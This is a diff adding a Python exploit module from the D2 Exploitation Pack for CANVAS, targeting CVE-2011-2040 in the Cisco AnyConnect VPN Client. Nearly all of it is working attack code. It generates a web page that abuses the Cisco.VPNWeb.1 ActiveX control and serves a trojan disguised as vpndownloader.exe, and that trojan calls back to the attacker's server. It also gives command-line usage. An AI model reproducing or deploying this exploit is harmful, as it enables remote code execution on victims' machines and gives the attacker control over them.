@@ -1,0 +1,160 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2011
+#
+
+
+import sys
+
+if '.' not in sys.path: 
+	sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import *
+from httpclientside import httpclientside
+from libs.canvasos import *
+from MOSDEF import pelib 
+
+import struct
+
+# GUI info
+NAME = "Cisco AnyConnect VPN Client Arbitrary Program Execution Vulnerability"
+
+DESCRIPTION = "Arbitrary program execution vulnerability in Cisco AnyConnect VPN Client"
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2011.06.01"
+DOCUMENTATION["VersionsAffected"] = "AnyConnect for Windows < 2.3.185"
+DOCUMENTATION["References"] = "http://dvlabs.tippingpoint.com/advisory/TPTI-09-11"
+DOCUMENTATION["CVE Name"] = "CVE-2011-2040"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2040"
+DOCUMENTATION["Notes"] = ""
+
+VERSION='1.0'
+
+GTK2_DIALOG='dialog.glade2'
+
+PROPERTY={}
+PROPERTY['TYPE'] = 'Exploit'
+PROPERTY['SITE'] = 'Clientside'
+PROPERTY['ARCH'] = [ ["Windows"] ]
+
+NOTES="""
+Usage:
+.\commandlineInterface.py -p 5555 -v 1
+.\exploits\httpserver\httpserver.py -v 1 -O singleexploit:d2sec_ciscoany -l 192.168.1.1 -d 5555 -p 80
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : ["All"], 
+}
+
+class theexploit(tcpexploit,httpclientside):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        httpclientside.__init__(self)
+        self.clientversion = 1        
+        self.badstring = ""
+        self.name = NAME 
+        self.filename = "index.html"
+        self.trojannamew = "app.exe"
+        return
+    
+
+    def makefile(self):
+        filedata = """
+<HTML> 
+<BODY>
+ 
+<DIV id="targetDiv">
+
+</DIV>
+
+<SCRIPT language="javascript">  
+
+try {		
+	var detect = new ActiveXObject("Cisco.VPNWeb.1");
+	
+	if (detect) {	
+		document.getElementById("targetDiv").innerHTML = "<object classid='clsid:55963676-2F5E-4BAF-AC28-CF26AA587566' id='target'>";					
+        target.url = "http://SERVERHOST:SERVERPORT/";		
+	}
+}
+catch(e) {}
+
+</SCRIPT> 
+
+</BODY> 
+</HTML>        
+"""
+
+        filedata = filedata.replace('SERVERHOST', self.callback.ip)
+        filedata = filedata.replace('SERVERPORT', str(self.callback.port))
+
+      	if self.useSSL:
+      		filedata = filedata.replace('http:', 'https:')
+              		
+        return filedata
+ 
+        
+    def maketrojan(self):
+        t_os = canvasos("Windows")
+        t_os.arch = "X86"
+    
+        self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os = t_os, http=True, ssl=self.useSSL)        
+        self.log("Writing out %d bytes to %s"%(len(self.mosdeftrojan), self.trojannamew))
+        file(self.trojannamew, "wb").write(self.mosdeftrojan)
+        self.setInfo("%s - done"%(NAME))
+        ret = len(self.mosdeftrojan) != 0
+        
+        return ret
+
+    def makesploit(self, clientheader, clientbody):        
+        from libs.spkproxy import header, body
+        h = header('SERVER')
+        b = body()	              	
+	
+        self.maketrojan()
+
+        if clientheader.URL.count(self.filename):
+            self.log("Sending HTML file: %s" % (self.filename))            
+            sploitstring = self.makefile()
+            b.setBody(sploitstring)                          	        
+        elif clientheader.URL.count("vpndownloader.exe"):
+            self.log("Sending MOSDEF trojan")
+            f = open(self.trojannamew, "rb")
+            sploitstring = f.read()
+            f.close()
+            os.remove(self.trojannamew)
+            self.log("Sending %d bytes" % len(sploitstring))
+            h.addHeader("Content-type", "binary/octet-stream")
+            h.addHeader("Connection", "close")
+            b.setBody(sploitstring)              
+        elif clientheader.URL.count("update.txt"):                                	
+            sploitstring = "d2d2d2d2"
+            b.setBody(sploitstring)                                    
+        else:
+            self.log('Redirecting to self')
+            h.status = '302'
+            h.addHeader('Location', self.filename)
+            h.addHeader('Content-Type', 'binary/octet-stream')
+            
+        return h, b
+
+    def neededListenerTypes(self):
+        from canvasengine import HTTPMOSDEF
+        return [HTTPMOSDEF]
+                           
+    def run(self):        
+        return 1
+
+if __name__=='__main__':
+    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
